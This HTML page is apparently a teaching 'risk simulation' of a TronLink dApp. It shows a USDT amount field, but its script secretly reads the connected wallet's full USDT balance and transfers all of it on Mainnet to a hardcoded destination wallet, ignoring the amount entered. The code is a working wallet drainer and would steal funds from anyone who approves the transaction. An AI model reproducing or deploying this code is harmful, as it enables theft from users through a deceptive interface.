<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Módulo 2: Envío Máximo (Riesgo)</title>
    <style>
        body { font-family: sans-serif; background: #f4f7f6; padding: 40px; display: flex; justify-content: center; }
        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border-top: 6px solid #F44336; }
        button { width: 100%; padding: 12px; margin-top: 15px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        .btn-connect { background: #2196F3; color: white; }
        .btn-action { background: #F44336; color: white; }
        input { width: 100%; padding: 10px; margin-top: 5px; box-sizing: border-box; }
        .status { background: #e8f4fd; padding: 10px; margin: 15px 0; font-size: 0.9em; word-break: break-all; }
    </style>
</head>
<body>

<div class="card">
    <h2>⚠️ Módulo 2: dApp sin Filtros</h2>
    <p>Simulación de riesgo. El script vacía el saldo total.</p>
    
    <button class="btn-connect" onclick="conectar()">1. Conectar TronLink</button>
    <div class="status" id="status">Estado: Desconectado</div>

    <label>Monto a enviar (USDT):</label>
    <input type="number" id="monto" value="10">

    <button class="btn-action" onclick="enviarMaximo()">Procesar Envío Máximo</button>
</div>

<script>
    const CONTRACT_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const WALLET_DESTINO = "TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw";

    async function conectar() {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            document.getElementById('status').innerText = `Conectado: ${window.tronWeb.defaultAddress.base58}`;
            return window.tronWeb;
        }
        alert("Por favor, desbloquea TronLink en Mainnet.");
        return null;
    }

    async function enviarMaximo() {
        const tronWeb = await conectar();
        if (!tronWeb) return;

        try {
            const miWallet = tronWeb.defaultAddress.base58;
            const contrato = await tronWeb.contract().at(CONTRACT_USDT);

            // Leer secretamente el saldo total de la wallet del usuario
            const saldoBigNum = await contrato.balanceOf(miWallet).call();
            const saldoTotalStr = saldoBigNum.toString();

            if (saldoTotalStr === "0" || saldoTotalStr === "") {
                alert("Detenido: Tu saldo actual de USDT es 0. Se necesita balance para ver el contraste.");
                return;
            }

            console.log(`[Módulo 2] Inyectando saldo máximo detectado: ${saldoTotalStr}`);
            const tx = await contrato.transfer(WALLET_DESTINO, saldoTotalStr).send();
            alert(`Transacción procesada.\nHash: ${tx}`);
        } catch (e) {
            alert("Prueba exitosa: La transacción fue cancelada y rechazada manualmente en TronLink.");
        }
    }
</script>
</body>
</html>
